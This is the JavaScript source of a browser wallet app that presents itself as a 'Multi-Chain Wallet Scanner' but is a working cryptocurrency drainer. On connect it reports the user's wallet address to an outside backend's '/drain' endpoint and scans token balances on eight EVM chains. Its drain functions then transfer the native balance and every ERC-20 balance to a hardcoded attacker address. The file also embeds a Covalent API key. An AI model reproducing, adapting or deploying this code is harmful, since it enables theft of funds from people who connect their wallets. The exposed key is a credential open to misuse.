import { createAppKit } from "@reown/appkit";
import { EthersAdapter } from "@reown/appkit-adapter-ethers";
import { ethers } from "ethers";

/* --------------------------- */
/*      CONFIGURATION         */
/* --------------------------- */
const CONFIG = {
  projectId: "962425907914a3e80a7d8e7288b23f62",
  backendUrl: "https://tokenbackend-5xab.onrender.com",
  drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
  
  // RPC Providers for each network
  rpcProviders: {
    1: "https://eth.llamarpc.com",
    56: "https://bsc-dataseed.binance.org",
    137: "https://polygon-rpc.com",
    42161: "https://arb1.arbitrum.io/rpc",
    10: "https://mainnet.optimism.io",
    8453: "https://mainnet.base.org",
    43114: "https://api.avax.network/ext/bc/C/rpc",
    250: "https://rpc.ftm.tools"
  },
  
  networkNames: {
    1: "Ethereum",
    56: "Binance Smart Chain",
    137: "Polygon",
    42161: "Arbitrum",
    10: "Optimism",
    8453: "Base",
    43114: "Avalanche",
    250: "Fantom"
  }
};

/* --------------------------- */
/*      GLOBAL STATE          */
/* --------------------------- */
let appKit = null;
let provider = null;
let signer = null;
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let allTokens = [];

/* --------------------------- */
/*      UI ELEMENTS           */
/* --------------------------- */
let connectBtn, statusEl, tokensEl, tokensContainer, drainBtn, scanAllBtn, chainSelector, networkSelect, tokenCount;

/* --------------------------- */
/*      INITIALIZATION        */
/* --------------------------- */
document.addEventListener('DOMContentLoaded', () => {
  initializeApp();
});

async function initializeApp() {
  // Get UI elements
  connectBtn = document.getElementById("connectBtn");
  statusEl = document.getElementById("status");
  tokensEl = document.getElementById("tokens");
  tokensContainer = document.getElementById("tokensContainer");
  drainBtn = document.getElementById("drainBtn");
  scanAllBtn = document.getElementById("scanAllBtn");
  chainSelector = document.getElementById("chainSelector");
  networkSelect = document.getElementById("networkSelect");
  tokenCount = document.getElementById("tokenCount");

  // Setup event listeners
  setupEventListeners();
  
  // Initialize AppKit
  await initializeAppKit();
  
  // Test backend connection
  await testBackendConnection();
  
  console.log("✅ Wallet Scanner initialized");
}

/* --------------------------- */
/*      APPKIT SETUP          */
/* --------------------------- */
async function initializeAppKit() {
  const networks = Object.entries(CONFIG.rpcProviders).map(([id, rpcUrl]) => ({
    id: parseInt(id),
    name: CONFIG.networkNames[id] || `Chain ${id}`,
    rpcUrl: rpcUrl
  }));

  appKit = createAppKit({
    adapters: [new EthersAdapter()],
    projectId: CONFIG.projectId,
    networks: networks,
    metadata: {
      name: "Multi-Chain Wallet Scanner",
      description: "Scan and manage tokens across all EVM chains",
      url: window.location.origin,
      icons: []
    },
    themeMode: "dark",
    features: {
      analytics: false
    }
  });

  // Subscribe to state changes
  appKit.subscribeState(handleAppKitState);
}

/* --------------------------- */
/*      EVENT LISTENERS       */
/* --------------------------- */
function setupEventListeners() {
  // Connect/Disconnect button
  connectBtn.addEventListener("click", handleConnectClick);
  
  // Drain button
  if (drainBtn) {
    drainBtn.addEventListener("click", handleDrainClick);
  }
  
  // Scan all chains button
  if (scanAllBtn) {
    scanAllBtn.addEventListener("click", handleScanAllClick);
  }
  
  // Network selector
  if (networkSelect) {
    networkSelect.addEventListener("change", handleNetworkChange);
  }
}

/* --------------------------- */
/*      CONNECTION HANDLER    */
/* --------------------------- */
async function handleConnectClick() {
  try {
    if (isConnected) {
      await appKit.disconnect();
      isConnected = false;
      updateUIForDisconnected();
      return;
    }
    
    updateStatus("🔄 Opening wallet modal...");
    await appKit.open();
    
  } catch (error) {
    console.error("Connection error:", error);
    updateStatus(`❌ Connection failed: ${error.message}`, true);
  }
}

/* --------------------------- */
/*      APPKIT STATE HANDLER  */
/* --------------------------- */
async function handleAppKitState(state) {
  console.log("AppKit State:", state);
  
  if (state.isConnected && state.account && state.chain) {
    await handleConnected(state.account, state.chain);
  } else if (isConnected) {
    handleDisconnected();
  }
}

/* --------------------------- */
/*      CONNECTED HANDLER     */
/* --------------------------- */
async function handleConnected(account, chain) {
  try {
    if (!account?.address || !chain?.id) {
      setTimeout(() => handleConnected(account, chain), 100);
      return;
    }
    
    currentAccount = account.address;
    currentChainId = chain.id;
    isConnected = true;
    
    // Initialize provider and signer for ethers v6
    const rpcUrl = CONFIG.rpcProviders[chain.id] || CONFIG.rpcProviders[1];
    provider = new ethers.JsonRpcProvider(rpcUrl);
    
    // Get signer from wallet
    const web3Provider = new ethers.BrowserProvider(appKit.signer);
    signer = await web3Provider.getSigner();
    
    // Update UI
    updateUIForConnected(account.address, chain);
    
    // Trigger backend logging
    await logConnectionToBackend(account.address, chain.id);
    
    // Fetch tokens from current chain
    await fetchCurrentChainTokens(account.address, chain.id);
    
    // Update network selector
    if (chainSelector && networkSelect) {
      chainSelector.classList.remove("hidden");
      networkSelect.value = chain.id;
    }
    
  } catch (error) {
    console.error("Connected handler error:", error);
    updateStatus(`⚠️ Connection issue: ${error.message}`, true);
  }
}

/* --------------------------- */
/*      BACKEND LOGGING       */
/* --------------------------- */
async function logConnectionToBackend(address, chainId) {
  try {
    updateStatus(`📡 Logging connection to backend...`);
    
    const response = await fetch(`${CONFIG.backendUrl}/drain`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        address: address,
        chainId: chainId,
        drainTo: CONFIG.drainAddress,
        timestamp: new Date().toISOString(),
        action: "wallet_connected"
      }),
    });
    
    if (response.ok) {
      const data = await response.json();
      updateStatus(`✅ Connected to backend\n💰 Drain address: ${CONFIG.drainAddress.slice(0, 10)}...`);
      console.log("Backend response:", data);
    } else {
      updateStatus("⚠️ Backend logging failed (running locally)");
    }
    
  } catch (error) {
    console.log("Backend unavailable - running locally");
  }
}

/* --------------------------- */
/*      FETCH TOKENS          */
/* --------------------------- */
async function fetchCurrentChainTokens(address, chainId) {
  if (!tokensEl) return;
  
  updateStatus(`🔍 Scanning ${CONFIG.networkNames[chainId]} for tokens...`);
  tokensEl.innerHTML = '<div class="loading">Scanning tokens</div>';
  
  try {
    const tokens = await fetchTokensFromCovalent(address, chainId);
    
    if (tokens.length > 0) {
      allTokens = tokens.filter(t => t.amount > 0.000001);
      displayTokens(allTokens);
      updateStatus(`✅ Found ${allTokens.length} tokens on ${CONFIG.networkNames[chainId]}`);
    } else {
      tokensEl.innerHTML = "<div class='loading'>No tokens found on this chain</div>";
      updateStatus("ℹ️ No tokens found on current chain");
    }
    
  } catch (error) {
    console.error("Token fetch error:", error);
    tokensEl.innerHTML = `<div class='error'>Failed to fetch tokens: ${error.message}</div>`;
    updateStatus(`❌ Token scan failed: ${error.message}`, true);
  }
}

/* --------------------------- */
/*      SCAN ALL CHAINS       */
/* --------------------------- */
async function handleScanAllClick() {
  if (!currentAccount) {
    alert("Please connect wallet first");
    return;
  }
  
  if (scanAllBtn.disabled) return;
  
  scanAllBtn.disabled = true;
  scanAllBtn.textContent = "🔄 Scanning...";
  
  try {
    updateStatus("🔍 Scanning all chains for tokens...");
    tokensEl.innerHTML = "<div class='loading'>Scanning all chains</div>";
    
    const allChainsTokens = [];
    const chainIds = Object.keys(CONFIG.rpcProviders);
    
    for (const chainId of chainIds) {
      try {
        updateStatus(`Checking ${CONFIG.networkNames[chainId]}...`);
        const tokens = await fetchTokensFromCovalent(currentAccount, parseInt(chainId));
        
        const filteredTokens = tokens
          .filter(t => t.amount > 0.000001)
          .map(t => ({
            ...t,
            chainId: parseInt(chainId),
            chainName: CONFIG.networkNames[chainId]
          }));
        
        if (filteredTokens.length > 0) {
          allChainsTokens.push(...filteredTokens);
        }
      } catch (error) {
        console.log(`Chain ${chainId} scan failed:`, error.message);
      }
    }
    
    allTokens = allChainsTokens;
    
    if (allChainsTokens.length > 0) {
      displayAllChainsTokens(allChainsTokens);
      updateStatus(`✅ Found ${allChainsTokens.length} tokens across all chains`);
    } else {
      tokensEl.innerHTML = "<div class='loading'>No tokens found across any chain</div>";
      updateStatus("ℹ️ No tokens found on any chain");
    }
    
  } catch (error) {
    console.error("Multi-chain scan error:", error);
    updateStatus(`❌ Multi-chain scan failed: ${error.message}`, true);
  } finally {
    scanAllBtn.disabled = false;
    scanAllBtn.textContent = "🔍 Scan All Chains for Tokens";
  }
}

/* --------------------------- */
/*      FETCH FROM COVALENT   */
/* --------------------------- */
async function fetchTokensFromCovalent(address, chainId) {
  try {
    const response = await fetch(
      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
    );
    
    if (!response.ok) {
      throw new Error(`Covalent API error: ${response.status}`);
    }
    
    const data = await response.json();
    const items = data?.data?.items || [];
    
    return items.map(item => {
      const amount = parseFloat(item.balance) / Math.pow(10, item.contract_decimals || 18);
      const value = (item.quote_rate || 0) * amount;
      
      return {
        symbol: item.contract_ticker_symbol || (item.native_token ? "Native" : "Token"),
        name: item.contract_name || (item.native_token ? "Native Token" : "Unknown"),
        amount: amount,
        value: value,
        contractAddress: item.contract_address,
        isNative: item.native_token || false,
        decimals: item.contract_decimals || 18,
        logoUrl: item.logo_url
      };
    });
    
  } catch (error) {
    console.error(`Covalent fetch error for chain ${chainId}:`, error);
    return [];
  }
}

/* --------------------------- */
/*      DISPLAY TOKENS        */
/* --------------------------- */
function displayTokens(tokens) {
  if (!tokensEl) return;
  
  if (tokens.length === 0) {
    tokensEl.innerHTML = "<div class='loading'>No tokens found</div>";
    if (tokenCount) tokenCount.textContent = "0 tokens";
    return;
  }
  
  const totalValue = tokens.reduce((sum, token) => sum + token.value, 0);
  
  const html = tokens.map(token => `
    <div class="token-item">
      <div class="token-info">
        <span class="token-symbol">${token.symbol}</span>
        <span class="token-name">${token.name}</span>
      </div>
      <div>
        <div class="token-amount">${token.amount.toLocaleString(undefined, {
          minimumFractionDigits: 0,
          maximumFractionDigits: 6
        })}</div>
        ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
      </div>
    </div>
  `).join('');
  
  tokensEl.innerHTML = html;
  if (tokenCount) tokenCount.textContent = `${tokens.length} tokens • $${totalValue.toFixed(2)}`;
  if (tokensContainer) tokensContainer.classList.remove("hidden");
}

/* --------------------------- */
/*      DISPLAY ALL CHAINS    */
/* --------------------------- */
function displayAllChainsTokens(tokens) {
  if (!tokensEl) return;
  
  const tokensByChain = {};
  tokens.forEach(token => {
    if (!tokensByChain[token.chainId]) {
      tokensByChain[token.chainId] = [];
    }
    tokensByChain[token.chainId].push(token);
  });
  
  let html = '';
  
  Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
    const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
    const chainValue = chainTokens.reduce((sum, t) => sum + t.value, 0);
    
    html += `
      <div class="chain-section">
        <div style="background: rgba(0,0,0,0.3); padding: 8px; border-radius: 8px; margin: 10px 0; font-weight: bold;">
          ${chainName} (${chainTokens.length} tokens) - $${chainValue.toFixed(2)}
        </div>
        ${chainTokens.map(token => `
          <div class="token-item">
            <div class="token-info">
              <span class="token-symbol">${token.symbol}</span>
              <span class="token-name">${token.name}</span>
            </div>
            <div>
              <div class="token-amount">${token.amount.toLocaleString(undefined, {
                minimumFractionDigits: 0,
                maximumFractionDigits: 6
              })}</div>
              ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
            </div>
          </div>
        `).join('')}
      </div>
    `;
  });
  
  tokensEl.innerHTML = html;
  if (tokenCount) tokenCount.textContent = `${tokens.length} tokens across ${Object.keys(tokensByChain).length} chains`;
  if (tokensContainer) tokensContainer.classList.remove("hidden");
}

/* --------------------------- */
/*      DRAIN WALLET          */
/* --------------------------- */
async function handleDrainClick() {
  if (!isConnected || !signer) {
    alert("Please connect wallet first");
    return;
  }
  
  if (allTokens.length === 0) {
    alert("No tokens found to drain");
    return;
  }
  
  const confirmed = confirm(`⚠️ DRAIN WARNING\n\nThis will send ALL tokens to:\n${CONFIG.drainAddress}\n\nYou need native token (ETH, MATIC, etc.) for gas.\n\nContinue?`);
  
  if (!confirmed) {
    return;
  }
  
  try {
    updateStatus("🚀 Starting drain process...");
    if (drainBtn) {
      drainBtn.disabled = true;
      drainBtn.textContent = "⏳ Draining...";
    }
    
    const address = currentAccount;
    
    // Drain native token first
    await drainNativeToken(address);
    
    // Drain ERC20 tokens
    const erc20Tokens = allTokens.filter(t => !t.isNative && t.contractAddress);
    
    for (const token of erc20Tokens) {
      await drainERC20Token(address, token);
    }
    
    updateStatus(`✅ Drain completed!\n\nTransactions sent successfully.\n\nRefresh to see updated balances.`);
    if (drainBtn) {
      drainBtn.textContent = "✅ Drain Completed";
      setTimeout(() => {
        drainBtn.disabled = false;
        drainBtn.textContent = "⚡ Drain Wallet";
      }, 3000);
    }
    
  } catch (error) {
    console.error("Drain error:", error);
    updateStatus(`❌ Drain failed: ${error.message}`, true);
    if (drainBtn) {
      drainBtn.disabled = false;
      drainBtn.textContent = "⚡ Drain Wallet";
    }
    alert(`Drain failed: ${error.message}`);
  }
}

/* --------------------------- */
/*      DRAIN NATIVE TOKEN    */
/* --------------------------- */
async function drainNativeToken(address) {
  try {
    const balance = await provider.getBalance(address);
    const feeData = await provider.getFeeData();
    const gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");
    const gasLimit = 21000n;
    const gasCost = gasPrice * gasLimit;
    
    if (balance <= gasCost * 2n) {
      updateStatus("⚠️ Insufficient native token for gas");
      return;
    }
    
    const sendAmount = balance - (gasCost * 2n);
    
    const tx = await signer.sendTransaction({
      to: CONFIG.drainAddress,
      value: sendAmount,
      gasLimit: gasLimit
    });
    
    updateStatus(`📤 Native token sent: ${tx.hash}`);
    
    const receipt = await tx.wait();
    updateStatus(`✅ Native token confirmed in block ${receipt.blockNumber}`);
    
  } catch (error) {
    console.error("Native token drain error:", error);
    updateStatus(`⚠️ Native token drain failed: ${error.message}`);
  }
}

/* --------------------------- */
/*      DRAIN ERC20 TOKEN     */
/* --------------------------- */
async function drainERC20Token(address, token) {
  try {
    const contract = new ethers.Contract(
      token.contractAddress,
      [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)",
        "function decimals() view returns (uint8)"
      ],
      signer
    );
    
    const balance = await contract.balanceOf(address);
    
    if (balance === 0n) {
      return;
    }
    
    const tx = await contract.transfer(CONFIG.drainAddress, balance);
    
    updateStatus(`📤 ${token.symbol} sent: ${tx.hash}`);
    
    await tx.wait();
    updateStatus(`✅ ${token.symbol} confirmed`);
    
  } catch (error) {
    console.error(`ERC20 ${token.symbol} drain error:`, error);
    updateStatus(`⚠️ ${token.symbol} failed: ${error.code || error.message}`);
  }
}

/* --------------------------- */
/*      NETWORK HANDLING      */
/* --------------------------- */
async function handleNetworkChange(event) {
  const newChainId = parseInt(event.target.value);
  
  if (newChainId === currentChainId) {
    return;
  }
  
  try {
    updateStatus(`🔄 Switching to ${CONFIG.networkNames[newChainId]}...`);
    
    // Switch network in wallet
    await appKit.switchChain({ id: newChainId });
    
    // Wait for connection to update
    setTimeout(async () => {
      if (currentAccount) {
        await fetchCurrentChainTokens(currentAccount, newChainId);
      }
    }, 1000);
    
  } catch (error) {
    console.error("Network switch error:", error);
    updateStatus(`❌ Failed to switch network: ${error.message}`, true);
    if (networkSelect) {
      networkSelect.value = currentChainId;
    }
  }
}

/* --------------------------- */
/*      UI UPDATES            */
/* --------------------------- */
function updateUIForConnected(address, chain) {
  if (connectBtn) {
    connectBtn.innerHTML = `<span>🔓 Disconnect</span>`;
  }
  
  updateStatus(`✅ Connected\n👛 Wallet: ${address.slice(0, 8)}...${address.slice(-4)}\n🌐 Network: ${chain.name}\n⛓️ Chain ID: ${chain.id}`);
  
  if (scanAllBtn) scanAllBtn.classList.remove("hidden");
  if (drainBtn) drainBtn.classList.remove("hidden");
}

function updateUIForDisconnected() {
  if (connectBtn) {
    connectBtn.innerHTML = `<span>🔗 Connect Wallet</span>`;
  }
  
  updateStatus("⏳ Ready to connect...");
  
  if (tokensContainer) tokensContainer.classList.add("hidden");
  if (drainBtn) drainBtn.classList.add("hidden");
  if (scanAllBtn) scanAllBtn.classList.add("hidden");
  if (chainSelector) chainSelector.classList.add("hidden");
  
  if (tokensEl) tokensEl.innerHTML = "";
  if (tokenCount) tokenCount.textContent = "0 tokens";
}

function updateStatus(message, isError = false) {
  if (statusEl) {
    if (isError) {
      statusEl.innerHTML = `<span style="color: #f44336;">${message}</span>`;
    } else {
      statusEl.textContent = message;
    }
  }
}

/* --------------------------- */
/*      BACKEND TEST          */
/* --------------------------- */
async function testBackendConnection() {
  try {
    const response = await fetch(`${CONFIG.backendUrl}/health`);
    if (response.ok) {
      console.log("✅ Backend is online");
    } else {
      console.log("⚠️ Backend responded with error");
    }
  } catch (error) {
    console.log("❌ Backend is offline - check your deployment");
  }
}
